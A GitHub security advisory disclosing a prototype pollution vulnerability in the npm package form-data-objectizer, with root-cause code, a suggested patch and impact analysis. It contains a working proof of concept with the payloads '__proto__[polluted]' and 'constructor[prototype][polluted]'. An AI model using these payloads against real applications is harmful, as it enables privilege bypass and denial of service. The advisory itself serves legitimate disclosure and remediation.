# [H] form-data-objectizer: Prototype pollution in form-data-objectizer via bracket-notation form keys

## Summary
Severity: High
Advisory: GHSA-m2hg-wjq3-28wq
CVE: CVE-2026-46510
CWE: CWE-1321
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L (CVSS_V3)
Published: 2026-05-18
Source: https://github.com/advisories/GHSA-m2hg-wjq3-28wq
Type: github-advisory

## Affected
- npm: `form-data-objectizer` — affected >=0 <1.0.1

## Details
## Summary

`form-data-objectizer` walks bracket-notation form keys (e.g. `name[sub]`) into nested objects without filtering `__proto__`, `constructor`, or `prototype`. A single HTTP form field whose name starts with `__proto__[...]` causes the library to mutate `Object.prototype`, which is a prototype pollution primitive of the entire Node.js process.

The bug is in `treatInitial` and `treatSecond` inside `index.cjs`:

```js
if (inputName in result) {           // 'in' walks the prototype chain, so '__proto__' matches
  newResult = result[inputName]      // newResult === Object.prototype
}
// ...
result[key] = value                  // sets the property on Object.prototype
```

With the form key `__proto__[polluted]` and value `yes`:

1. `treatInitial` matches `inputName = "__proto__"`, `rest = "[polluted]"`.
2. `"__proto__" in result` is true (inherited), so `newResult = result["__proto__"]`, which is `Object.prototype`.
3. `treatSecond` recurses with `key = "polluted"`, `newRest = ""`, and assigns `Object.prototype.polluted = "yes"`.

## Affected versions

- `form-data-objectizer` `<= 1.0.0` (currently the only published version)

## Patched

Not yet. Suggested fix: reject any segment equal to `__proto__`, `constructor`, or `prototype` before walking into `result[inputName]` / `result[key]`. Either throw or skip the entry.

Minimum patch in `treatInitial` and `treatSecond`:

```js
const REJECT = new Set(['__proto__', 'constructor', 'prototype']);
if (REJECT.has(inputName) || REJECT.has(key)) {
  return; // or throw
}
```

Using `Object.create(null)` for the `result` object would also work since it has no prototype to pollute, but the `key === '__proto__'` direct write still needs guarding.

## Proof of concept

Fresh install on Node 18+:

```sh
mkdir pp-fdo && cd pp-fdo
npm init -y
npm install form-data-objectizer@1.0.0
```

```js
// poc.js
const FormDataToObject = require('form-data-objectizer');

const form = new FormData();
form.append('username', 'alice');
form.append('__proto__[polluted]', 'yes');

FormDataToObject.toObject(form);
console.log(({}).polluted); // -> 'yes'
```

Observed output:

```
package version: 1.0.0
before pollution: undefined
after pollution:  yes
parsed data:     { username: 'alice' }
confirmed:       YES, prototype polluted
```

The field name `__proto__[polluted]` is the kind of value an attacker can submit from any HTML form or HTTP client. After the call, every plain object in the process inherits `polluted = 'yes'`. The visible parsed output drops the malicious key, so the attack leaves no obvious trace in request logs that show parsed bodies.

A second working payload is `constructor[prototype][polluted]=yes`, which walks `result.constructor` then `.prototype`.

## Impact

- Default-reachable prototype pollution via a single unauthenticated HTTP form submission, in any Node.js application that uses `form-data-objectizer.toObject()` on incoming form data.
- Persists for the life of the worker process and affects every subsequent request handled by the same process.
- Direct downstream consequences depend on the host application and the rest of its dependency tree, but typical risks include: bypassing `if (obj.isAdmin)` style checks, injecting unintended config values into objects merged with user input, breaking template rendering, and crashing the worker by polluting properties used by other libraries (DoS).

## CVSS

`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L` (8.2, High)

Integrity is High because the primitive lets the attacker change the meaning of property reads on every object in the process. Confidentiality is None and Availability is Low without a named downstream gadget; both could be higher in a specific consuming app.

## Credit

Reported by Mohamed Bassia (@0xBassia).

## References
- https://github.com/kaspernj/form-data-objectizer/security/advisories/GHSA-m2hg-wjq3-28wq
- https://nvd.nist.gov/vuln/detail/CVE-2026-46510
- https://github.com/kaspernj/form-data-objectizer/commit/7c54b99408e6e9cd6533b7245bf197dadc2a2dbc
- https://github.com/kaspernj/form-data-objectizer
